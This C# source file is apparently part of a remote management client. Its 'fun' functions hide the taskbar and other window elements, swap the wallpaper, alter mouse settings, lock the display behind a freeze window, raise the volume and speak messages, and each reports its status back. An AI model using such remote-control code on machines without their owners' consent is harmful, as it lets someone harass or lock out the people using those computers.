using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.IO;
using System.Windows.Forms;
using System.Threading;

namespace Art_RMS_Client.Pages
{
    class Fun_Functions
    {
        #region Inport Dll
        [DllImport("user32.dll")]
        private static extern IntPtr FindWindow(string ClassName, string WindowName);

        [DllImport("user32.dll")]
        private static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter,string className, string windowName);

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern int SystemParametersInfo(int uAction, int uParam, int lpvParam, int fuWinIni);

        #endregion
        private static List<Object> Forms = new List<Object>();

        public static void Hide_Element(string Class_Name, string Child_Class_Name)
        {
            IntPtr Hwnd = FindWindow(Class_Name, null);
            if (Child_Class_Name != "")
            {
                Hwnd = FindWindowEx(Hwnd, IntPtr.Zero, Child_Class_Name, null);
            }
            ShowWindow(Hwnd, 0);
        } // Скрытие элементов
        public static void Show_Element(string Class_Name, string Child_Class_Name)
        {
            IntPtr Hwnd = FindWindow(Class_Name, null);
            if (Child_Class_Name != "")
            {
                Hwnd = FindWindowEx(Hwnd, IntPtr.Zero, Child_Class_Name, null);
            }
            ShowWindow(Hwnd, 5);
        } // Показ элементов
        public static void Change_wallpaper(byte[] photo)
        {
            try
            {
                Functions.Send("STATUS|Changed WallPaper");
                File.WriteAllBytes(Path.GetTempPath() + "WP.jpg", photo);
                SystemParametersInfo(20, 0, Path.GetTempPath() + "WP.jpg", 0x01 | 0x02);
            }
            catch { Functions.Send("STATUS|ERROR Change WallPaper"); }
        } //Смена фона рабочего стола
        public static void Change_Parameters_Mouse(string function, int value)
        {
            switch (function)
            {
                case "CHANGE_SPEED_MOUSE":
                    SystemParametersInfo(0x0071, 0, value, 0);// скорость от 1 до 20
                    break;
                case "CHANGE_SPEED_DOUBLE_CLICK_MOUSE":
                    SystemParametersInfo(0x0020, value, 0, 0); // 1-5000 mc
                    break;
                case "CHANGE_MOUSE_TRACK":
                    SystemParametersInfo(0x005D, value, 0, 0); // 0-10
                    break;
                case "CHANGE_SPEED_SCROLL_MOUSE":
                    SystemParametersInfo(0x0069, value, 0, 0); // 0-100
                    break;
            }
        } //Смена настроек мыши
        public static void Block_Display()
        {
             foreach (Form item in Forms)
                 if ((string)item.Tag == "Block_Display")
                     return;
            new Thread(() =>
            {
                Freeze_Window Freeze_Form = new Freeze_Window();
                Freeze_Form.Tag = "Block_Display";
                Forms.Add(Freeze_Form);
                Freeze_Form.ShowDialog();
            }).Start();

        }
        public static void Unlock_Display()
        {
            foreach (Form Frm in Forms)
                if ((string)Frm.Tag == "Block_Display")
                {
                    var form = (Freeze_Window)Frm;
                    form.Close = false;
                    form.DialogResult = DialogResult.OK;
                    Forms.Remove(form);
                    break;
                }
        }

        [DllImport("user32.dll")]
        private static extern byte MapVirtualKey(uint uCode, uint uMapType);
        [DllImport("user32.dll")]
        private static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, uint dwExtraInfo);
        public static void Change_Volume(string volume)
        {
            try {
                for(int i = 0; i < Convert.ToInt32(volume); i++)
                    keybd_event(175, MapVirtualKey(175u, 0u), 1u, 0u);
            }
            catch{}
        }
        public static void Read_Message(string message)
        {
            new System.Speech.Synthesis.SpeechSynthesizer().SpeakAsync(message);
        }


    }
}
